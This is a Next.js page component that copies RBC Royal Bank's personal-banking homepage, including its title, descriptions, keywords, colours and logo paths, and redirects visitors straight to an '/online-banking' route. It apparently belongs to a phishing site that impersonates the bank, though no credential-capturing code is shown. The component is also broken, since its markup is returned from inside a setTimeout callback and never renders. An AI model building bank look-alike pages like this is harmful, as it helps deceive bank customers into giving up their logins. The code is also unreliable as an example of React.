import Head from "next/head";
import { Inter } from "next/font/google";
import { useRouter } from "next/router";
import React from "react";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  const router = useRouter();
  React.useEffect(() => {
    router.push("/online-banking");
  }, []);
  setTimeout(() => {
    return (
      <>
        <Head>
          <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
          <title>Personal Banking - RBC Royal Bank</title>
          <meta
            name="description"
            content="Explore the personal banking services and products available from RBC Royal Bank to help you manage your finances, buy a home, invest and more."
          />
          <meta
            name="keywords"
            content="personal banking, bank accounts, credit cards, loans, mortgages, rbc, royal bank of canada"
          />
          <meta
            property="og:title"
            content="Get the Personal Banking Products and Services You Need"
          />
          <meta
            property="og:description"
            content="Whatever you need, RBC Royal Bank has a wide range of personal banking products, services and tools to help you manage your finances, save for retirement, buy a home and much more."
          />
        </Head>
        <main>
          <header style={{ background: "#026AC3", color: "#fff" }}>
            <ul style={{ listStyleType: "none", padding: 0, display: "flex" }}>
              <li>Personal</li>
              <li>Business</li>
              <li>Wealth</li>
              <li>About RBC</li>
            </ul>
            <a href="special-promotions/index-or.html" class="promo-link">
              Promotions
            </a>
          </header>
          <div class="logo-img">
            <img
              src="dvl/v1.0/assets/images/logos/rbc-logo-shield.svg"
              width="78"
              height="100"
              alt="RBC"
            />
          </div>
          <div class="logo-text">Royal Bank</div>
          <div class="header-content">
            <div
              class="search-trigger"
              id="header-search-btn"
              aria-label="Open search dialog"
              role="button"
              tabindex="0"
            >
              <span class="search-text" id="header-search-text-btn">
                <img
                  src="dvl/v1.0/assets/images/icons/icon-search-inverse.svg"
                  width="24"
                  height="25"
                  alt=""
                />
                <span>Search RBC...</span>
              </span>
            </div>
          </div>
        </main>
      </>
    );
  }, 1000);
}
